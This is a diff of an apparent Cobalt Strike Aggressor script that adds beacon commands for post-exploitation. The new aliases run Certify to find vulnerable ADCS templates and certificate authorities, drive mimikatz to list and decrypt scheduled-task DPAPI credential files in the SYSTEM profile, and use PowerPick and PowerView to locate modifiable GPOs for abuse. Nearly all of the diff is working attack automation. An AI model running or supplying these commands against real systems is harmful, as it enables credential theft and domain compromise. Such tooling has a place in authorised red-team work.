@@ -13,6 +13,7 @@ $SHAREPERSIST_PATH  = getFileProper("C:\\Tools\\SharPersist\\SharPersist\\bin\\R
 $SHARPUP_PATH       = getFileProper("C:\\Tools\\SharpUp\\SharpUp\\bin\\Release","SharpUp.exe");
 $GETSERVICEACL_PATH = getFileProper("c:\\Tools","Get-ServiceAcl.ps1");
 $POWERLURK_PATH     = getFileProper("C:\\Tools","PowerLurk.ps1");
+$CERTIFY_PATH       = getFileProper("C:\\Tools\\Certify\\Certify\\bin\\Release","Certify.exe");
 
 #TEST FUNCTION
 command beacons {
@@ -160,6 +161,14 @@ beacon_command_register(
     "rubeus",
     "Execute Assmembly of Rubeus",
     "Execute Assmembly of Rubeus\n\nArgs must be wrapped in double quotes"
+);
+alias certify {
+    bexecute_assembly($1, $CERTIFY_PATH, $2);
+}
+beacon_command_register(
+    "certify",
+    "Execute Assmembly of Certify",
+    "Execute Assmembly of Certify\n\nArgs must be wrapped in double quotes"
 );
 
 alias seatbelt {
@@ -465,6 +474,7 @@ beacon_command_register(
 ##STORED SCHEDULED TASK CREDS
 ###FIND CREDENTIAL FILES
 $files = @();
+$currentfile = "";
 $masterkey = '';
 sub dpapi_schtask_listCredFiles_mimicred_cb {
     #$1 = beacon ID, $2 = results, $3 = information map
@@ -472,8 +482,7 @@ sub dpapi_schtask_listCredFiles_mimicred_cb {
     local('$regex');
     $regex = 'guidMasterKey.*\{(.*)\}';
     $masterkey = matches($2, $regex)[0];
-    println("dpapi_schtask_listCredFiles_mimicred_cb - Master Key: " . $masterkey);
-    println("dpapi_schtask_listCredFiles_mimicred_cb - File: " . $files);
+    blog($1, "KeyGUID: " . $masterkey . " " . "File: " . $currentfile);
 }
 sub dpapi_schtask_listCredFiles_lscb {
     #$1 = beacon ID, $2 = the folder, $3 = results
@@ -482,20 +491,81 @@ sub dpapi_schtask_listCredFiles_lscb {
     $files = matches($3, $regex);
     # blog($1, "Found Credential Files: " . $files);
     foreach $file ($files){
+        $currentfile = $file;
         bmimikatz($1, "dpapi::cred /in: $+ $path $+ \\ $+ $file $+ ",$null,$null,&dpapi_schtask_listCredFiles_mimicred_cb);
-        println("dpapi_schtask_listCredFiles_lscb - Master Key: " . $masterkey);
-        println("dpapi_schtask_listCredFiles_lscb - File: " . $files);
     }
+    blog($1, "Run the command 'mimikatz !sekurlsa::dpapi' to find the master key for the corresponding GUID")
 }
 alias dpapi_schtask_listCredFiles {
     $path = "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials";
     bls($1, $path, &dpapi_schtask_listCredFiles_lscb);
-    println("dpapi_schtask_listCredFiles - Master Key: " . $masterkey);
-    println("dpapi_schtask_listCredFiles - File: " . $files);
-
-    
 }
 beacon_command_register(
     "dpapi_schtask_listCredFiles",
     "List Scheduled Task Credential Files"
 )
+
+###GET CRED FILE MASTER KEY AND DECRYPT
+alias dpapi_schtask_decryptCredFiles {
+    #$1 =  beacon, $2 FileID, $3 MasterKey
+    $mimikatzCommand = 'dpapi::cred ' .
+    "/in:C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials\\ $+ $2 $+  " .
+    "/masterkey: $+ $3 $+ ";
+
+    bmimikatz($1, $mimikatzCommand);
+}
+beacon_command_register (
+    "dpapi_schtask_decryptCredFiles",
+    "Decrypt given Scheduled Tasks Credential File",
+    "Usage: dpapi_schtask_decryptCredFiles [FileID] [MasterKey]"
+);
+
+#ADCS
+##FIND CERT AUTHORITY
+alias adcs_findcas {
+    bexecute_assembly($1, $CERTIFY_PATH, "cas");
+}
+beacon_command_register(
+    "adcs_findcas",
+    "Find the Certificate Authority Server"
+);
+
+##FIND VULNERABLE TEMPLATES
+alias adcs_checktempaltes{
+    bexecute_assembly($1, $CERTIFY_PATH, "find /vulnerable");
+}
+beacon_command_register(
+    "adcs_checktempaltes",
+    "Look for vulnerable ADCS templates"
+);
+
+#GPO ABUSE METHODS
+##FIND MODIFIABLE GPOs
+alias gpo_findvulngpos {
+    #bpowershell_import($1, $POWERVIEW_PATH);
+    $command = 'Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "CreateChild|WriteProperty" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" }';
+    bpowerpick($1, $command);
+}
+beacon_command_register(
+    "gpo_findvulngpos",
+    "Use PowerPick to find modifiable GPOs"
+);
+alias gpo_locategpo {
+    #bpowershell_import($1, $POWERVIEW_PATH);
+    $command = "Get-DomainGPO -Identity \" $+ $2 $+ \" | select displayname,gpcfilesyspath";
+    bpowerpick($1, $command);
+}
+beacon_command_register(
+    "gpo_locategpos",
+    "Use PowerPick to find modifiable GPOs",
+    "Usage: gpo_locategpos [GPO DN]"
+);
+alias gpo_convertfromsid {
+    $command = "ConvertFrom-SID  $+ $2 $+ ";
+    bpowerpick($1, $command);
+}
+beacon_command_register(
+    "gpo_convertfromsid",
+    "Use PowerPick to find modifiable GPOs",
+    "Usage: gpo_convertfromsid [SID]"
+);
